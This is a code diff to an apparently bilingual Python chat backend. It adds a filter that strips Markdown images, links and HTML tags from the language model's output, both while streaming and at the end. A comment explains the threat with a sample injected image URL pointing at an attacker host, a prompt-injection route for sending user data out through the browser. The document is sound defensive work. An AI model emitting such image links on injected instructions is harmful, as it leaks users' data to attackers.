@@ -79,6 +79,43 @@ def held_back(text: str) -> str:
 ASK_LINE = re.compile(r"(?m)^[ \t]*\**[ \t]*(À demander|A demander|To ask)[ \t]*\**[ \t]*:[ \t]*\**[ \t]*")
 
 
+# Links and images written by the model itself are not shown: an image is fetched by the browser as soon as it
+# is displayed, so an injected "![](https://attacker/?q=...)" would send data out (the "lethal trifecta" of the
+# course: remove the way out). The only links shown are built from the database (versions line, cards).
+MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
+MD_LINK = re.compile(r"\[([^\]]*)\]\((?:https?:|www\.|//)[^)]*\)")
+HTML_TAG = re.compile(r"<\s*(?:img|a|iframe|script|link|source|video|audio)\b[^>]*>|</\s*a\s*>", re.I)
+AUTOLINK = re.compile(r"<(https?://[^>\s]+)>")
+
+
+def _hold_open_link(text: str) -> str:
+    """Cut a link, image or tag that may still be opening at the end of a streamed text."""
+    lt = text.rfind("<")
+    if lt >= 0 and ">" not in text[lt:]:
+        text = text[:lt]
+    if text.endswith("!"):
+        text = text[:-1]
+    br = text.rfind("[")
+    if br >= 0:
+        tail = text[br:]
+        close = tail.find("]")
+        # "[x" or "[x]" or "[x](..." not yet closed: it may still become a link
+        if close < 0 or close == len(tail) - 1 or (tail[close + 1] == "(" and ")" not in tail[close:]):
+            text = text[:br - 1] if br > 0 and text[br - 1] == "!" else text[:br]
+    return text
+
+
+def no_model_links(text: str, final: bool = False) -> str:
+    """The model's text without images, links or HTML tags (the link text is kept). While streaming, an
+    image or link not yet closed waits, so nothing is shown and then taken back."""
+    if not final:
+        text = _hold_open_link(text)
+    text = MD_IMAGE.sub("", text)
+    text = MD_LINK.sub(lambda m: m.group(1), text)
+    text = AUTOLINK.sub(lambda m: m.group(1).split("//", 1)[-1].split("/", 1)[0], text)
+    return HTML_TAG.sub("", text)
+
+
 def bold_ask(text: str) -> str:
     return ASK_LINE.sub(lambda m: "**To ask:** " if m.group(1) == "To ask" else "**À demander :** ", text)
 
@@ -151,7 +188,7 @@ def render(out: dict) -> str:
     """Plain Markdown answer for clients that do not stream: the answer, then its sources from the
     database. The model's own "Sources:" line is dropped: the block built from the database replaces it."""
     lang = out.get("lang", "fr")
-    parts = [bold_ask(no_dashes(MODEL_SOURCES_LINE.sub("", out["answer"]).rstrip()))]
+    parts = [bold_ask(no_dashes(no_model_links(MODEL_SOURCES_LINE.sub("", out["answer"]).rstrip(), final=True)))]
     refs = out.get("citations", {})
     if refs.get("cited"):
         parts.append(versions_line(refs["cited"], links=True, lang=lang))  # no source cards outside a chat interface
@@ -293,7 +330,7 @@ def answer_events(question: str, history: list[dict]):
             not_found = True
             break
         end = SOURCES_START.search(text)
-        visible = bold_ask(no_dashes(numbered(text[:end.start()] if end else held_back(text), known)))
+        visible = bold_ask(no_dashes(numbered(no_model_links(text[:end.start()] if end else held_back(text)), known)))
         visible = visible.rstrip("\n") + ("\n" if visible.endswith("\n") else "")  # no runs of blank lines
         if len(visible) > shown:
             yield {"content": visible[shown:]}
@@ -304,6 +341,7 @@ def answer_events(question: str, history: list[dict]):
         return
     end = SOURCES_START.search(text)
     answer_text = (text[:end.start()] if end else text).rstrip()
+    answer_text = no_model_links(answer_text, final=True)  # no model links or images; an image's alt text is not a citation
     visible = bold_ask(no_dashes(numbered(answer_text, known, final=True)))
     if len(visible) > shown:
         yield {"content": visible[shown:]}
